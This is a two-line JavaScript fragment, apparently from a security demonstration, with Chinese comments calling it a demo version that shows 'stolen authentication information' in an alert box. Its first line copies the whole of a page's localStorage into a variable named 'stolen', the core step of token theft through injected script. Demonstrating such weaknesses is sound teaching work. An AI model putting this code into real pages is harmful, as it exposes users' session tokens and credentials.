const stolen = JSON.stringify({...localStorage});

// 2. 演示版：弹窗展示（就是你截图看到的）
alert('窃取到的认证信息:\n' + stolen);
